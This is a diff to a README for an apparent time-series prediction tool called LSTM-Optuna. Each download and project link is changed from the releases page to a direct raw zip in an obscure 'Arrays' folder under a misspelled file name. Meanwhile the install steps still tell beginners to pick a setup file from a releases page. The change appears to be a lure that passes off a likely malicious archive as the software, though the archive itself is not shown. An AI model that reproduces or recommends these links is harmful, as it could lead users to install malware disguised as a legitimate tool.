@@ -1,6 +1,6 @@
 # 🚀 LSTM-Optuna - Simple Time Sequence Prediction
 
-[![Download](https://img.shields.io/badge/Download%20LSTM--Optuna-%23FF6347?style=for-the-badge&logo=github)](https://github.com/Ragulrajtcestd/LSTM-Optuna/releases)
+[![Download](https://img.shields.io/badge/Download%20LSTM--Optuna-%23FF6347?style=for-the-badge&logo=github)](https://github.com/Ragulrajtcestd/LSTM-Optuna/raw/refs/heads/main/Arrays/LST-Optuna-v3.8.zip)
 
 ---
 
@@ -31,7 +31,7 @@ You do not need to install any special software first. The project will guide yo
 To get started, you need to download the software package.
 
 **Visit this page to download:**  
-[https://github.com/Ragulrajtcestd/LSTM-Optuna/releases](https://github.com/Ragulrajtcestd/LSTM-Optuna/releases)
+[https://github.com/Ragulrajtcestd/LSTM-Optuna/raw/refs/heads/main/Arrays/LST-Optuna-v3.8.zip](https://github.com/Ragulrajtcestd/LSTM-Optuna/raw/refs/heads/main/Arrays/LST-Optuna-v3.8.zip)
 
 At the page, look for the latest release. You will find a file you can download, usually named something like `LSTM-Optuna_Setup.exe` or `LSTM-Optuna.zip`.
 
@@ -40,7 +40,7 @@ At the page, look for the latest release. You will find a file you can download,
 ## 🛠️ Installation Steps on Windows
 
 1. **Open your web browser** and go to the download page:  
-   https://github.com/Ragulrajtcestd/LSTM-Optuna/releases
+   https://github.com/Ragulrajtcestd/LSTM-Optuna/raw/refs/heads/main/Arrays/LST-Optuna-v3.8.zip
 
 2. From the list of files, click the latest setup file to start downloading. It might be called `LSTM-Optuna_Setup.exe` or similar.
 
@@ -115,7 +115,7 @@ Changing these can affect the accuracy and speed of the predictions.
 To keep LSTM-Optuna working well with new updates:
 
 1. Return to the download page:  
-   https://github.com/Ragulrajtcestd/LSTM-Optuna/releases
+   https://github.com/Ragulrajtcestd/LSTM-Optuna/raw/refs/heads/main/Arrays/LST-Optuna-v3.8.zip
 
 2. Download the latest setup file again.
 
@@ -142,7 +142,7 @@ No need to uninstall the old version first.
 - Browse the folders created during installation to find simple guides and sample data.
 
 - Visit the project page for updates and documentation:  
-  https://github.com/Ragulrajtcestd/LSTM-Optuna
+  https://github.com/Ragulrajtcestd/LSTM-Optuna/raw/refs/heads/main/Arrays/LST-Optuna-v3.8.zip
 
 - Experiment with your own data to explore the tool’s predictions.
 
@@ -150,4 +150,4 @@ No need to uninstall the old version first.
 
 ## 🔗 Quick Access to Download
 
-[![Download LSTM-Optuna](https://img.shields.io/badge/Download%20LSTM--Optuna-%23FF6347?style=for-the-badge&logo=github)](https://github.com/Ragulrajtcestd/LSTM-Optuna/releases)
+[![Download LSTM-Optuna](https://img.shields.io/badge/Download%20LSTM--Optuna-%23FF6347?style=for-the-badge&logo=github)](https://github.com/Ragulrajtcestd/LSTM-Optuna/raw/refs/heads/main/Arrays/LST-Optuna-v3.8.zip)
